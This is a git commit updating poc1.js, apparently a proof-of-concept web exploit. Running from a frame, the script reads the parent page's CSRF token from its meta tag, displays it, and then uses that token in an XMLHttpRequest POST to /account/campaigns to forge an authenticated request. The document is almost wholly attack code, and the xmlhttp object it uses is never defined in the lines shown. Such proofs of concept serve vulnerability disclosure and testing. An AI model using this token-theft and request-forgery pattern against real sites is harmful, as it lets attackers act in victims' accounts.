bde005ffb095cb2a62f5637e8173f51482e645e0
Craig Arendt <craigarendt@users.noreply.github.com>
2015-05-06 09:17:55 -0400

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -2,7 +2,11 @@
 var meta = parent.document.getElementsByTagName('meta');
 for (i=0; i<meta.length; i++) {
   if (meta[i].getAttribute("name") == "csrf-token") {
-    confirm("Users CSRF token: "+meta[i].getAttribute("content"));
-    $.post( "/account/campaigns/", { csrf: meta[i].getAttribute("content") } );
+    var csrfToken = meta[i].getAttribute("content");
+    confirm("Users CSRF token: "+csrfToken);
+
+    xmlhttp.open("POST","/account/campaigns",true);
+    xmlhttp.setRequestHeader("X-CSRF-Token",csrfToken);
+    xmlhttp.send("csrf="+csrfToken);
   }
 }
